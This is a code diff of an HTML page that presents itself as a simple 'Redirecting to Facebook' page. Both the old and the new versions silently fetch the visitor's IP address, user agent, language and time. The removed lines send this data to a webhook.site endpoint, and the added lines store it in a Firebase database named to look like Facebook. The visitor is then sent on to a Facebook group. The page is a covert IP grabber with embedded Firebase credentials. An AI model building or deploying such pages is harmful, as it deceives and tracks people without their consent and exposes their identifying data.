@@ -2,46 +2,49 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Facebook Redirect</title>
-  <script>
-    window.onload = () => {
-      const ipLog = async () => {
-        try {
-          const res = await fetch("https://api.ipify.org?format=json");
-          const data = await res.json();
-          const ip = data.ip;
+  <title>Redirecting...</title>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-firestore.js";
 
-          const info = {
-            ip: ip,
-            userAgent: navigator.userAgent,
-            lang: navigator.language,
-            time: new Date().toISOString()
-          };
-
-          // Send to your webhook
-          fetch("https://webhook.site/https://webhook.site/3f8b1463-76de-4107-8477-db9df154a4de", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(info)
-          });
-
-        } catch (err) {
-          console.error(err);
-        }
-      };
-
-      ipLog();
-
-      // Optional: auto-redirect after logging
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com/groups/poodleloverscommunityworld";
-      }, 2000);
+    const firebaseConfig = {
+      apiKey: "AIzaSyBfYKdA0G0Ye22jDupSc7Lw5pZbFzokXUA",
+      authDomain: "facebook-93ba2.firebaseapp.com",
+      projectId: "facebook-93ba2",
+      storageBucket: "facebook-93ba2.firebasestorage.app",
+      messagingSenderId: "315327556086",
+      appId: "1:315327556086:web:3a67a003d3b4859710bfd7"
     };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const logData = async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+
+        await addDoc(collection(db, "visits"), {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          lang: navigator.language,
+          time: new Date().toISOString()
+        });
+
+        // Redirect after logging
+        setTimeout(() => {
+          window.location.href = "https://www.facebook.com/groups/poodleloverscommunityworld";
+        }, 1500);
+
+      } catch (err) {
+        console.error("Logging failed", err);
+      }
+    };
+
+    window.onload = logData;
   </script>
 </head>
 <body>
-  <h2>Redirecting to Facebook...</h2>
+  <h3>Redirecting to Facebook...</h3>
 </body>
 </html>
